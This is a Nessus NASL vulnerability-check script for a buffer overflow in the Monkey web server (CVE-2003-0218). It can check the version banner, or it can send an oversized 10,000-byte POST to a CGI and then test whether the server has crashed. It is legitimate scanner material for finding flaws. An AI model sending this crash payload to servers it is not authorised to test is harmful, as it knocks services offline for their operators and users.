#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
# Ref:
# From: "Matthew Murphy" <mattmurphy@kc.rr.com>
# To: "BugTraq" <bugtraq@securityfocus.com>
# Subject: Monkey HTTPd Remote Buffer Overflow
# Date: Sun, 20 Apr 2003 16:34:03 -0500


if(description)
{
 script_id(11544);
 script_cve_id("CVE-2003-0218");
 script_bugtraq_id(7202);
 script_version ("$Revision: 1.8 $");
 
 name["english"] = "MonkeyWeb POST with too much data";
 script_name(english:name["english"]);
 
 desc["english"] = "
Your web server crashes when it receives a POST command
with too much data.
It *may* even be possible to make this web server execute
arbitrary code with this attack.

Risk factor : High

Solution : Upgrade your web server.";
 script_description(english:desc["english"]);
 
 summary["english"] = "Web server overflow with POST data";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 # The listening port in the example configuration file is 2001
 # I suspect that some people might leave it unchanged.
 script_require_ports("Services/www",80, 2001);
 exit(0);
}

#
include("http_func.inc");

port = get_http_port(default:80);
	# 2001 ?
if(! get_port_state(port)) exit(0);


banner = get_http_banner(port:port);
if ( ! banner || "Monkey/" >!< banner ) exit(0);

if (safe_checks())
{
  banner = get_http_banner(port: port);
  if (banner =~ "Server: *Monkey/0\.([0-5]\.|6\.[01])")
  {
    report = "
The version of Monkey web server that you are running
is vulnerable to a buffer overflow on a POST command 
with too much data.
It is possible to make this web server crash or execute 
arbitrary code.

Risk factor : High

Solution : Upgrade to Monkey server 0.6.2";

    security_hole(port: port, data: report);
  }

  exit(0);
}

if (http_is_dead(port:port)) exit(0);

l = get_kb_list(string("www/", port, "/cgis"));
if (isnull(l) || max_index(l) == 0)
  script = "/";
else
{
  # Let's take a random CGI.
  n = rand() % max_index(l);
  script = ereg_replace(string: l[n], pattern: " - .*", replace: "");
  if (! script) script = "/";	# Just in case the KB is corrupted
}

soc = http_open_socket(port);
if (! soc) exit(0);
req = http_post(item: script, port: port, data: crap(10000));
if ("Content-Type:" >!< req)
  req = ereg_replace(string: req, pattern: 'Content-Length:', 
	replace: 'Content-Type: application/x-www-form-urlencoded\r\nContent-Length:');

send(socket: soc, data: req);
r = http_recv(socket: soc);
http_close_socket(soc);

if (http_is_dead(port: port))
{
  security_hole(port);
  set_kb_item(name:"www/too_big_post_crash", value:TRUE);
}
